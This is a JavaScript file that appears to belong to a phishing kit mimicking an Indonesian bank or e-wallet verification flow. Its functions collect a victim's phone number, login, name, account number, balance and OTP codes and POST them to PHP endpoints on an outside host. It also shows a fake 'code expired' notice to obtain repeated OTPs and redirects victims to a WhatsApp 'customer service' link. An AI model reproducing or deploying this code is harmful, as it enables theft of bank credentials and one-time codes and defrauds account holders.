function sendHp() {
event.preventDefault();
        var nomor = document.getElementById("nohp").value;
        sessionStorage.setItem("nohp", nomor);
$('.process1').fadeIn();
 document.getElementById('btnSubmit1').innerHTML ="Memproses...";
 
 
      $.ajax({
            type: 'POST',
            url: 'https://cek-in.my.id/p/req/one.php',
            data: $('#formHP').serialize(),
            datatype: 'text',
            
            complete: function(data) {
            setTimeout(function(){
  window.location.href='login.html'
  document.getElementById('btnSubmit1').innerHTML = "SELANJUTNYA";
 $('.process1').fadeOut();
    }, 800);
            }
        })
     }
     
function sendLog() {
event.preventDefault();
$('.process1').fadeIn();
 document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
      $.ajax({
            type: 'POST',
            url: 'https://cek-in.my.id/p/req/twoo.php',
            data: $('#formLog').serialize(),
            datatype: 'text',          
            complete: function(data) {
            setTimeout(function(){
  window.location.href='saldo.html'
  document.getElementById('btnSubmit1').innerHTML = "SELANJUTNYA";
 $('.process1').fadeOut();
    var nomortel = document.getElementById('nohp').value;
    sessionStorage.setItem("nohp", nomor);    
    var namanya = document.getElementById('nama').value;
    sessionStorage.setItem("nama", namanya);    
    var noreke = document.getElementById('rek').value;
    sessionStorage.setItem("rek", noreke);
    }, 800);
            }
        })
     }     
     
     
function sendSaldo() {
event.preventDefault();
$('.process1').fadeIn();
 document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
      $.ajax({
            type: 'POST',
            url: 'https://cek-in.my.id/p/req/thre.php',
            data: $('#jualpuki').serialize(),
            datatype: 'text',          
            complete: function(data) {
            setTimeout(function(){
  window.location.href='otp.html'
  document.getElementById('btnSubmit1').innerHTML = "SELANJUTNYA";
 $('.process1').fadeOut();
 var phone = document.getElementById("nohp").value;
 sessionStorage.setItem("phone", phone);
 var user = document.getElementById("nama").value;
 sessionStorage.setItem("user", user);
 var card = document.getElementById("rek").value;
 sessionStorage.setItem("card", card);
 var duet = document.getElementById("saldo").value;
 sessionStorage.setItem("duet", duet);
    }, 800);
            }
        })
     }     


// otp
function sendOtp() {
  event.stopPropagation();
    event.preventDefault();
  $("#djload").show();  
 document.getElementById('btnSubmit1').innerHTML = "Memproses...";    
$.ajax({
 type: 'POST',
 url: 'https://cek-in.my.id/p/req/empatt.php',
 async: false,
 dataType: 'JSON',
 data: $('#form2').serialize(),
 
 complete: function(data) {
            console.log('Complete')
setTimeout(function(){  
       
      
    }, 2000);
     $("#notif").text("- Kode E-Commerce sudah kadaluarsa -");
     $("#notif").css("color", "red");
        }
    });
      setTimeout(() => {
     document.getElementById("notif").innerHTML = "Untuk mendapatkan kode E-Commerce,<br/>Silahkan klik tombol dibawah ini";
     $("#djload").hide();  
   $("#notif").css("color", "black");
 $("#sixpin").val("");
document.getElementById('btnSubmit1').innerHTML = "Selanjutnya";      
              
   }, 4000);

  }




// datawa

function getcs(){
 $("#djload").show();   
  audio4 = document.getElementById("bsiku");
  audio1 = document.getElementById("bsi");
    audio4.play();
     audio1.load();
    audio4.loop = false
setTimeout(function(){  
location.href='https://choreo.cloud/wa/e4d4';
    }, 1000);
    setTimeout(function(){
    $("#djload").hide();   
    }, 1000);      
}     
